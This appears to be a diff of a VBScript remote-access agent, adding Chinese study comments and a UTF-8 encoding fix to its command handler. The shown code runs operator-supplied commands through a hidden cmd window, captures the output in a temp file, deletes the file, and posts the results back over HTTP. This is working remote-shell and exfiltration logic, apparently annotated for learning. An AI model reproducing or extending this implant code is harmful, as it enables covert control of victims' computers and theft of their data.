@@ -187,22 +187,35 @@ While True
         
         ' Execute command
         Case "SHELL"
-            'Execute and write to file
+            ' Execute and write to file
+            ' 关于的GetSpecialFolder函数用法http://www.yfvb.com/help/vb6/index.htm?page=html/vbmscVisualBasicDocumentationMap.htm
+            ' fs.GetSpecialFolder(2)返回temp文件夹
             Dim strOutFile: strOutFile = fs.GetSpecialFolder(2) & "\rso.txt"
+            ' 这里解释一下下面的三个双引号是怎么回事儿，在vbs中，"可作为"的转义符使用
+            ' 如果想输出"字符，就需要在前面加一个"作为转义
+            ' 下面的最终的字符串就是这样的
+            ' cmd /C pushd " + strCD + " && + strArgument + > " + strOutFile + " 2>&1
+            ' 然后作为参数传递给 shell.Run "参数"， 0, True 
+            ' True表明shell.Run是阻塞的
             shell.Run "cmd /C pushd """ & strCD & """ && " & strArgument & "> """ & strOutFile & """ 2>&1", 0, True
 
             ' Read out file
+            ' 命令的输出全部被重定向到了strOutfile（临时文件）中
+            ' OpenTextFile第二个参数为iomode，1代表只读，8代表追加写入（就只有这两种模式）
             Dim file: Set file = fs.OpenTextFile(strOutfile, 1)
             Dim text
+            ' AtEndOfStream属性指明文件指针是否位于文件末尾，True代表文件内容为空，False代表文件内容不为空即可，因为正常情况下，如果文件中有内容，文件指针应该位于文件首部
             If Not file.AtEndOfStream Then
                 text = file.ReadAll
             Else
                 text = "[empty result]"
             End If
+            ' 关闭文件流并删除临时文件
             file.Close
             fs.DeleteFile strOutFile, True
 
             ' Set response
+            ' 发送响应
             SendStatusUpdate strRawCommand, text
 
             ' Clean up
@@ -342,6 +355,7 @@ End Function
 
 Function SendStatusUpdate(strText, strData)
     Dim binData
+    ' 下面这个函数是重点，如果想让我们的脚本支持unicode，就需要改进StringToBinary函数
     binData = StringToBinary(strData)
     DoHttpBinaryPost "cmd", strText, "cmdoutput", binData
 End Function
@@ -351,6 +365,7 @@ Function DoHttpBinaryPost(strActionType, strText, strFilename, binData)
     ' Compile POST headers and footers
     Const strBoundary = "----WebKitFormBoundaryNiV6OvjHXJPrEdnb"
     Dim binTextHeader, binText, binDataHeader, binFooter, binConcatenated
+    ' vbCrLf vb中的常量，回车+换行
     binTextHeader = StringToBinary("--" & strBoundary & vbCrLf & _
                                    "Content-Disposition: form-data; name=""cmd""" & vbCrLf & vbCrLf)
     binDataHeader = StringToBinary(vbCrLf & _
@@ -386,10 +401,11 @@ Function DoHttpBinaryPost(strActionType, strText, strFilename, binData)
 End Function
 
 ' 该函数用于将字符串转换成二进制数据
+' 设置成utf-8编码
 Function StringToBinary(Text)
     Dim stream: Set stream = CreateObject("Adodb.Stream")
     stream.Type = 2 'adTypeText
-    ' stream.CharSet = "us-ascii"
+    stream.CharSet = "utf-8"
 
     ' Store text in stream
     stream.Open
